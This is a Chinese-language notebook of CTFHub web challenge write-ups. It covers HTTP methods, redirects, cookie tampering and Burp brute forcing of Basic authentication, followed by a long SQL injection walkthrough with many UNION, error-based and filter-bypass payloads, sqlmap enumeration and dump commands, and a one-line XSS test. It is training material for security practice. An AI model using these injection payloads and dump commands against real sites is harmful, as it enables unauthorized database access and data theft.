# web前置技能

## *请求方式

### 方法一：burp抓包

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608192631440.png" alt="image-20220608192631440" style="zoom:80%;" />

将GET改为CTFHUB

![image-20220608192716856](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608192716856.png)

放包

![image-20220722094914777](upload\image-20220722094914777.png)

### 方法二：curl 命令

利用 curl 命令对本题求解在命令行中输入

![image-20220608194612149](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608194612149.png)

### 相关知识

| 号    | 方法        | 描述                                                         |
| ----- | ----------- | ------------------------------------------------------------ |
| **1** | **GET**     | **请求指定的页面信息，并返回实体主体。**                     |
| **2** | **HEAD**    | **类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头** |
| **3** | **POST**    | **向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。** |
| **4** | **PUT**     | **从客户端向服务器传送的数据取代指定的文档的内容。**         |
| **5** | **DELETE**  | **请求服务器删除指定的页面。**                               |
| **6** | **CONNECT** | **HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。** |
| **7** | **OPTIONS** | **允许客户端查看服务器的性能。**                             |
| **8** | **TRACE**   | **回显服务器收到的请求，主要用于测试或诊断。**               |
| **9** | **PATCH**   | **是对 PUT 方法的补充，用来对已知资源进行局部更新**          |

**要注意的是：**

```
方法名称是区分大小写的
当某个请求所针对的资源不支持对应的请求方法的时候
服务器应当返回状态码405（Mothod Not Allowed）
当服务器不认识或者不支持对应的请求方法时
应返回状态码501(Not Implemented)

HTTP服务器至少应该实现GET和HEAD/POST方法
其他方法都是可选的
此外除上述方法
特定的HTTP服务器支持扩展自定义的方法
```



## *302跳转

### 方法一：burp抓包

![9c6dc2efd2074c588f33acc08df6c843](C:\Users\16414\Desktop\9c6dc2efd2074c588f33acc08df6c843.png)

### 方法二：curl 命令

![image-20220608195744835](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608195744835.png)

审题：

HTTP临时[重定向](https://so.csdn.net/so/search?q=重定向&spm=1001.2101.3001.7020)，这道题涉及到有关HTTP重定向状态码。

### 相关知识

3XX响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。

- 301——永久性重定向。该状态码表示请求的资源已被分配了新的 URI ， 以后 应使用资源现在所指的 URI 。 也就是说，如果已经把资源对应的 URI 保存为书签了， 这时应该按 Location 首部字段提示的 URI 重新保存。

- 302——临时性重定向。该状态码表示请求的资源已被分配了新的URI，希望 用户（本次）能使用新的 URI 访问。

  **302与301的区别：和 301 Moved Permanently 状态码相似， 但 302 状态码代表的资源不是被永久移动， 只是临时性质的。换句话说，已移动的资源对应的 URI 将来还有可能发生改变。比如，用户把 URI 保存成书签，但不会 像 301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码 的页面对应的 URI 。**

- 303——该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。

  **303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码明确表示客户端应当采用 GET 方法获取资源， 这点与 302 状态码有区别。**

- 307——临时重定向。该状态码与 302 Found 有着相同的含义。尽管 302 标准禁止 POST 变换成 GET，但实际使用时大家并不遵守。307 会遵照浏览器标准，不会从 POST 变成 GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。



## *cookie

### 方法一：burp抓包

抓包 改包后放包就可以了

![image-20220722095017491](upload\image-20220722095017491.png)



放包

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608201052689.png" alt="image-20220608201052689" style="zoom:80%;" />

------

在许多逻辑数学中，0这个数字代表着False（假），1代表着True（真）。所以，尝试将admin=0中的“0”改成“1”，在Burp Suite中的repeater请求试试。

![image-20220722095131127](upload\image-20220722095131127.png)

### 方法二：F12控制台查看cookie

在控制台中输入document.cookie，发现admin=0

![image-20220608202503532](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608202503532.png)

重新设置将admin改为1

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608202603292.png" alt="image-20220608202603292" style="zoom:80%;" />

刷新界面，得到flag

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608202647831.png" alt="image-20220608202647831" style="zoom:80%;" />

### 相关知识

- **cookie：**

  在网站中，http请求是无状态的。也就是说即使第一次和服务器连接后并且登录成功后，第二次请求服务器依然不能知道当前请求是哪个用户。cookie的出现就是为了解决这个问题，第一次登录后服务器返回一些数据（cookie）给浏览器，然后浏览器保存在本地，当该用户发送第二次请求的时候，就会自动的把上次请求存储的cookie数据自动的携带给服务器，服务器通过浏览器携带的数据就能判断当前用户是哪个了。cookie存储的数据量有限，不同的浏览器有不同的存储大小，但一般不超过4KB。因此使用cookie只能存储一些小量的数据。

- **session:**

  session和cookie的作用有点类似，都是为了存储用户相关的信息。不同的是，cookie是存储在本地浏览器，而session存储在服务器。存储在服务器的数据会更加的安全，不容易被窃取。但存储在服务器也有一定的弊端，就是会占用服务器的资源，但现在服务器已经发展至今，一些session信息还是绰绰有余的。

**cookie和session结合使用：**

​        web开发发展至今，cookie和session的使用已经出现了一些非常成熟的方案。在如今的市场或者企业里，一般有两种存储方式：

　　存储在服务端：通过cookie存储一个session_id，然后具体的数据则是保存在session中。如果用户已经登录，则服务器会在cookie中保存一个session_id，下次再次请求的时候，会把该session_id携带上来，服务器根据session_id在session库中获取用户的session数据。就能知道该用户到底是谁，以及之前保存的一些状态信息。这种专业术语叫做server side session。

　　将session数据加密，然后存储在cookie中。这种专业术语叫做client side session。flask采用的就是这种方式，但是也可以替换成其他形式。因此使用cookie只能存储一些小量的数据



## *基础认证

### 方法一：burp抓包

点击这个click交互键，弹出来了一个登陆界面

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608211227109.png" alt="image-20220608211227109" style="zoom: 67%;" />

先任意输入admin/admin进行登录尝试。没什么反应。抓包看数据。可以看见一条特殊字符串Basic realm="Do u know admin ?，暂时没有其他线索，我们假设用户名就是admin，然后进行暴力破解。

![image-20220722095211234](upload\image-20220722095211234.png)

Base64解码得到开始尝试输入的账号和密码

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608211503311.png" alt="image-20220608211503311" style="zoom:80%;" />

将报文发送到Intruder，点击Add，将 Basic 后面 base64 部分添加为 payload position

![image-20220608211531490](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608211531490.png)

加载题目附件中的字典

![image-20220722095247116](upload\image-20220722095247116.png)

添加Base64编码

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608210139637.png" alt="image-20220608210139637" style="zoom:80%;" />

取消url编码勾选，不然=会被转换成%3d

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608210210861.png" alt="image-20220608210210861" style="zoom:80%;" />

开始爆破

![image-20220722095304349](upload\image-20220722095304349.png)

获得正确的账号密码，登录获得flag

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608213022086.png" alt="image-20220608213022086" style="zoom:80%;" />

复制粘贴，到数据包的base64编码位置，再send

![image-20220722095321765](upload\image-20220722095321765.png)

### 相关知识

**http基础认证：**

​        桌面应用程序也通过HTTP协议跟Web服务器交互， 桌面应用程序一般不会使用cookie, 而是把 "用户名+冒号+密码"用BASE64算法加密后的字符串放在http request 中的header Authorization中发送给服务端， 这种方式叫HTTP基本认证(Basic Authentication)
　　当浏览器访问使用基本认证的网站的时候， 浏览器会提示你输入用户名和密码，假如用户名密码错误的话， 服务器会返回401



## *响应包源代码

### 方法一：F12查看源码

<img src="upload\image-20220722095348428.png" alt="image-20220722095348428" style="zoom:80%;" />

# web工具配置

## *sql注入

Mysql表类型：在mysql内自带一个数据库，名为information_schema，在这个数据库内

- schemata，包含了所有的数据库名字
- tables，包含了所有数据库表
- columns，包含了所有字段
- column_name:列的名称
- Information_schema.columns:表示所有的列的信息
- Information_schema:表示所有信息，包括库、表、列
- Information_schema.tables:表示所有的表的信息
- table_schema:数据库的名称
- table_name:表的名称

### **整数型注入

**1.判断是否存在注入**

![image-20220608161909881](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608161909881.png)

![image-20220608161835915](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608161835915.png)

证明存在注入

**2.输入1，回显有两列。**

![image-20220608165014388](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608165014388.png)

**3.猜解SQL查询语句中的字段数**

![image-20220608162009960](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608162009960.png)

![image-20220608162031430](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608162031430.png)

![image-20220608162043946](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608162043946.png)

发现这里报错了，当id=1 order by 2时，页面返回与id=1相同的结果；而id=1 order by 3时不一样，故字段数量是2。

**4.确定显示位置/字段顺序/回显位/SQL语句插入位置**

![image-20220608162431069](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608162431069.png)

此时要先保证之前的数据查不出来，之后再union。id=-1数据不存在数据库中。可以看到位置2可以插入SQL语句。

**5.获取数据库库名**

（1）获取当前数据库库名和版本

![image-20220608162648995](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608162648995.png)

![image-20220608163317673](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608163317673.png)

得到数据库名称为：sqli，由数据库版本可知他是MySQL的一个分支

（2）获取所有数据库库名

-1 union select 1,group_concat(schema_name) from information_schema.schemata

![image-20220608163541238](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608163541238.png)

**6.获取数据库表名**

（1）方法一：一次获取一个表名

-1 union select 1,(select table_name from information_schema.tables where table_schema='sqli' limit 0,1)

![image-20220608163845276](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608163845276.png)

得到数据库表名：flag。修改limit中第一个数字，如获取第二个表名：limit 1,1，这样就可以获取所有的表名。

-1 union select 1,(select table_name from information_schema.tables where table_schema='sqli' limit 1,1)

![image-20220608164004072](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608164004072.png)

得到数据库表名：news

（2）方法二：一次性获取当前数据库所有表名

-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'

![image-20220608164123631](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608164123631.png)

得到数据库sqli中的表名为news和flag

**7.获取表中的字段名**

-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'

![image-20220608164513337](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608164513337.png)

**8.获取数据**

-1 union select 1,group_concat(flag) from sqli.flag

![image-20220608164745900](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608164745900.png)



### **字符型注入

**1.判断是否存在注入**

需要让语句闭合，正常执行，在url结尾输入%23 或者--+，正常闭合，%23为#，注释后面的语句,一定要注意“ ' ”英文输入下，否则容易爆错


去测试是否有sql漏洞

![image-20220609083944558](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609083944558.png)

![image-20220609084037093](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609084037093.png)

![image-20220609084958491](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609084958491.png)

发现1’ 报错
和 1 and 1=1,回显
而1 and 1=2,没有回显
得出结论，执行了逻辑语句and ,所以有sql漏洞

**2.输入1，回显**

注入类型是否为字符型注入，在输入id=1的时候发现输出结果为id=’1’，判断类型为字符

![image-20220609083749657](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609083749657.png)

**3.猜解SQL查询语句中的字段数**

1’ order by 1#

![image-20220609085330939](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609085330939.png)

1’ order by 2#

![image-20220609085422484](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609085422484.png)

1’ order by 3#

![image-20220609085522977](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609085522977.png)

可以看到3没有回显，所以只有两个字段

**4.确定显示位置/字段顺序/回显位/SQL语句插入位置**

![image-20220609090109758](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609090109758.png)

**5.获取数据库库名**

发现有两个字段可以执行，于是构造语句，查看当前数据库：

（1）获取当前数据库库名和版本

![image-20220609090256283](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609090256283.png)

![image-20220609090329995](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609090329995.png)

（2）获取所有数据库库名

-1' union select 1,group_concat(schema_name) from information_schema.schemata#

![image-20220609083313568](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609083313568.png)

**6.获取数据库表名**

（1）方法一：一次获取一个表名

-1' union select 1,(select table_name from information_schema.tables where table_schema='sqli' limit 0,1)#

![image-20220609090732300](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609090732300.png)

-1' union select 1,(select table_name from information_schema.tables where table_schema='sqli' limit 1,1)#

![image-20220609090927855](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609090927855.png)

2）方法二：一次性获取当前数据库所有表名

-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'#

![image-20220609083357239](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609083357239.png)

**7.获取表中的字段名**

-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'#

![image-20220609083448877](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609083448877.png)

**8.获取数据**

-1' union select 1,group_concat(flag) from sqli.flag#

![image-20220609083624560](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609083624560.png)



### **报错注入

#### 方法一：updatexml

**利用updatexml来xpath报错。**

1 and (select updatexml(1, (concat (0x7e, (select database()))),1)) 

![image-20220609094015870](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609094015870.png)

1 and (select updatexml(1, (concat (0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli'))),1))  

![image-20220609094048157](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609094048157.png)

1 and (select updatexml(1, (concat (0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'))),1)) 

![image-20220609094108544](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609094108544.png)

1 and (select updatexml(1, concat(0x7e, (select flag from flag)), 1))

![image-20220609094204065](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609094204065.png)

#### 方法二：extractvalue

**利用updatexml来xpath报错。**

1 and (select extractvalue(1, concat(0x7e, (select database()))))

![image-20220609094434010](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609094434010.png)

1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))

![image-20220609094525541](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609094525541.png)

1 and (select extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name= 'flag'))))

![image-20220609094655426](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609094655426.png)

1 and (select extractvalue(1, concat(0x7e, (select flag from flag))))

![image-20220609094729901](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609094729901.png)

#### 方法三：floor

**利用floor来group by主键重复报错。**

1 union select count(), concat((select database()), floor(rand(0)2)) x from news group by x

![image-20220609094922299](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609094922299.png)

1 union select count(), concat((select table_name from information_schema.tables where table_schema='sqli' limit 1,1), floor(rand(0)2)) x from news group by x

![image-20220609095259368](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609095259368.png)

1 union select count(), concat((select column_name from information_schema.columns where table_name='flag' limit 0,1), floor(rand(0)2)) x from news group by x

![image-20220609095554150](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609095554150.png)

1 union select count(), concat((select flag from flag limit 0,1), floor(rand(0)2)) x from news group by x

![image-20220609095627111](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609095627111.png)



### **布尔盲注

需要了解mysql的知识点：

union select 联合查询，联合注入常用
database() 回显当前连接的数据库
version() 查看当前sql的版本如：mysql 1.2.3， mariadb-4.5.6
group_concat() 把产生的同一分组中的值用,连接，形成一个字符串
information_schema 存了很多mysql信息的数据库
information_schema.schemata information_schema库的一个表,名为schemata
schema_name schemata表中存储mysql所有数据库名字的字段
information_schema.tables 存了mysql所有的表
table_schema tables表中存每个表对应的数据库名的字段
table_name 表的名字和table_schema一一对应
information_schema.columns columns表存了所有的列的信息4
column_name 当你知道一个表的名字时，可通过次字段获得表中的所有字段名(列名)
table_name 表的名字和column_name一一对应
select updatexml(1,concat(0x7e,database(),0x7e),1); 这里注意，只在databse()处改你想要的内容即可报错回显
right(str, num) 字符串从右开始截取num个字符
left(str,num) 同理:字符串从左开始截取num个字符
substr(str,N,M) 字符串，从第N个字符开始，截取M个字符

和一些基本sql语法
和一些基本注释：
#，–空格，/* */

------

使用sqlmap来进行爆破

```
python sqlmap.py -u "http://challenge-ebc1cd479c500d9e.sandbox.ctfhub.com:10800/?id=1" --dbs
```

这里python sqlmap.py -u"url" -batch是基本的注入框架，“-dbs”指向数据库。

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609164002178.png" alt="image-20220609164002178" style="zoom:80%;" />

```html
python sqlmap.py -u "http://challenge-ebc1cd479c500d9e.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables
```

-D是数据库，“-tables”指向爆破表名。

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609164153911.png" alt="image-20220609164153911" style="zoom:80%;" />

```
python sqlmap.py -u "http://challenge-ebc1cd479c500d9e.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns --dump
```

-T是表名，-columns是爆破列名,-dump是爆数据

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609164407130.png" alt="image-20220609164407130" style="zoom:80%;" />

### **时间盲注

基于时间的盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。

**盲注原理：**

盲注的本质就是猜解，在没有回显数据的情况下，我们只能靠‘感觉’来体会每次查询时一点点细微的差异，而这差异包括运行时间的差异和页面返回结果的差异。

对于基于布尔的盲注来说，我们可以构造一条注入语句来测试我们输入的布尔表达式，而这布尔表达式结果的真假，决定了每次页面有不同的反应。

对于基于时间的盲注来说，我们构造的语句中，包含了能否影响系统运行时间的函数，根据每次页面返回的时间，判断注入的语句是否被成功执行。

使用sqlmap来进行爆破

```
python sqlmap.py -u "http://challenge-e99a1b60dec1fa53.sandbox.ctfhub.com:10800/?id=1" --dbs
```

这里python sqlmap.py -u"url" -batch是基本的注入框架，“-dbs”指向数据库。

![image-20220609171203829](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609171203829.png)

```html
python sqlmap.py -u "http://challenge-e99a1b60dec1fa53.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables
```

-D是数据库，“-tables”指向爆破表名。

![image-20220609171339585](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609171339585.png)

```
python sqlmap.py -u "http://challenge-e99a1b60dec1fa53.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns --dump
```

-T是表名，-columns是爆破列名,-dump是爆数据

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609172005140.png" alt="image-20220609172005140" style="zoom:80%;" />

### **MySQL结构

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609171503924.png" alt="image-20220609171503924" style="zoom:80%;" />

**MYSQL的隐式类型转换：**

如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL<=>NULL 会返回1，不做类型转换。

两个参数都是字符串，按照字符串比较，不做类型转换。

两个参数都是整数，按照整数比较，不做类型转换。

如果不与数字进行比较，则将十六进制值视为二进制字符串。

有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较

所有其他情况下，两个参数都会被转换为浮点数再进行比较。

**利用算术运算符：**

实际中我们接触到的语句都是带有引号的，类似于where username='+input+' 这样的，这时候我们就需要做一些处理来构造false注入的利用点。

```
输入+ 则相当于语句被转化为 where username="+"
+,-,*,/,%都是同理。
```

**利用比较运算符：**

```
   安全等于：<=>
'=0<=>1# 拼接的语句：where username=''=0<=>1#'

   不等于<>(!=)
'=0<>0# 拼接的语句：where username=''=0<>0#'
```

**注入常用函数与字符：**

```
mid()---从文本字段中提取字符
limit()---返回前几条或者中间某几行数据
concat、concat_ws、group_concat
MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL
group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator '分隔符'])
rand随机数（产生0,1之间随机数）
```

#### 方法一：手动注入

首先先测试看看是否有注入，利用语句：

1

![image-20220609172629214](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609172629214.png)

1’

![image-20220609172338482](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609172338482.png)

1’ and 1=1#

![image-20220609172716892](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609172716892.png)

1 and 1=1

![image-20220609172737840](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609172737840.png)

1 and 1=2

![image-20220609172755409](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609172755409.png)

这里看到1’ 和1‘ and 1=1#,1 and 1=2不执行，而1 and 1=1 执行了
所以确定有注入

于是用语句查看有几个字段：
1 order by 1

![image-20220609172900509](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609172900509.png)

1 order by 2

![image-20220609172942306](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609172942306.png)

1 order by 3

![image-20220609172956927](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609172956927.png)

可以看到1 order by 3时没有执行，所以有两个字段

在利用语句查看能执行语句的字段：

```
-1 union select 1,2
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609173059574.png" alt="image-20220609173059574" style="zoom:80%;" />

返回了1，2两个字段的内容，所以这两个
字段能执行回显
于是构造语句查看当前数据库：
-1 union select 1,database()

![image-20220609173157303](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609173157303.png)

得到数据库sqli,在去得到数据库的表名，构造语句：

-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'

![image-20220609173528669](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609173528669.png)

发现一个奇怪的表ywjidlpwzg查看里面字段名字，构造语句：

-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='ywjidlpwzg'

![image-20220609173707227](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609173707227.png)

得到字段名，于是查看字段内容，构造语句：

-1 union select 1,group_concat(jdpbhbikgx) from sqli.ywjidlpwzg

![image-20220609174848752](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609174848752.png)



#### 方法二：sqlmap

使用sqlmap来进行爆破

```
python sqlmap.py -u "http://challenge-38f5e1e6f6150b87.sandbox.ctfhub.com:10800/?id=1" --dbs
```

这里python sqlmap.py -u"url" -batch是基本的注入框架，“-dbs”指向数据库。

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609172447522.png" alt="image-20220609172447522" style="zoom:80%;" />

```html
python sqlmap.py -u "http://challenge-38f5e1e6f6150b87.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables
```

-D是数据库，“-tables”指向爆破表名。

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609172424852.png" alt="image-20220609172424852" style="zoom:80%;" />

```
python sqlmap.py -u "http://challenge-38f5e1e6f6150b87.sandbox.ctfhub.com:10800/?id=1" -D sqli -T ywjidlpwzg --columns --dump
```

-T是表名，-columns是爆破列名,-dump是爆数据

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609174425883.png" alt="image-20220609174425883" style="zoom:80%;" />

### **cookie注入

##### 方法一：手动注入

发现这是cookie注入，于是就抓包得到：

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609181008568.png" alt="image-20220609181008568" style="zoom:80%;" />

尝试注入,查询数据库名

![image-20220609185001905](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609185001905.png)

成功查询到数据库名sqli

查询表名

![image-20220609185118785](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609185118785.png)

查询字段名

![image-20220609185238785](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609185238785.png)

查询字段信息

-1 union select 1,group_concat(kgsdqlfoph) from sqli.ylrpuanbhl

![image-20220609185840546](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609185840546.png)

##### 方法二：sqlmap

```
python sqlmap.py -u "http://challenge-47c00bc0db3c63c7.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 --dbs
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609191129064.png" alt="image-20220609191129064" style="zoom:80%;" />

```
python sqlmap.py -u "http://challenge-47c00bc0db3c63c7.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli --tables
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609192236679.png" alt="image-20220609192236679" style="zoom:80%;" />

```
python sqlmap.py -u "http://challenge-47c00bc0db3c63c7.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli -T ylrpuanbhl --columns --dump
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609192411795.png" alt="image-20220609192411795" style="zoom:80%;" />



#### ***UA注入

##### 方法一：手动注入

**对UA进行注入判断：**-1 union select 1,2

![image-20220609214024321](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609214024321.png)

**得到数据库名：** -1 union select 1,database()

![image-20220609213032122](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609213032122.png)

**查询数据库的表名：**-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'

![image-20220609213339807](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609213339807.png)

**查询wvzxmdldse的字段名（列名）：**-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='wvzxmdldse'

![image-20220609213524503](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609213524503.png)

**查询字段信息：**-1 union select 1,group_concat(xglmorvoqs) from sqli.wvzxmdldse

![image-20220609213644250](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609213644250.png)

##### 方法二：sqlmap

```
python sqlmap.py -u "http://challenge-14cd98dd43f8801f.sandbox.ctfhub.com:10800/?id=1" --level 3 --dbs
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609234331986.png" alt="image-20220609234331986" style="zoom:80%;" />

```
python sqlmap.py -u"http://challenge-14cd98dd43f8801f.sandbox.ctfhub.com:10800/?id=1" --level 3 -D sqli --tables
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220609234852569.png" alt="image-20220609234852569" style="zoom:80%;" />

```
python sqlmap.py -u"http://challenge-14cd98dd43f8801f.sandbox.ctfhub.com:10800/?id=1" --level 3 -D sqli -T oujeaeuenc --columns
```

![image-20220610001330115](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610001330115.png)

```
python sqlmap.py -u "http://challenge-14cd98dd43f8801f.sandbox.ctfhub.com:10800/?id=1" --level 3 -D sqli -T oujeaeuenc -C kdulqytdrv --dump
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610003128596.png" alt="image-20220610003128596" style="zoom:80%;" />

#### ***Refer注入

![image-20220610003721442](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610003721442.png)

![image-20220610004050816](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610004050816.png)

![image-20220610004142559](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610004142559.png)

![image-20220610004246002](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610004246002.png)

### **过滤空格

此处过滤的方法为/**/，将所有空格替换即可

```
-1/**/union/**/select/**/1,database()
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610004636702.png" alt="image-20220610004636702" style="zoom:80%;" />

```
-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='sqli'
```

![image-20220610004706937](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610004706937.png)

```
-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='vbcdtuxijo'
```

![image-20220610005327214](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610005327214.png)

```
-1/**/union/**/select/**/1,group_concat(xnmoiqaqbh)/**/from/**/vbcdtuxijo
```

![image-20220610005545729](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610005545729.png)



## *XSS

<script>alert("xss")<script/>

![image-20220610101156383](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610101156383.png)

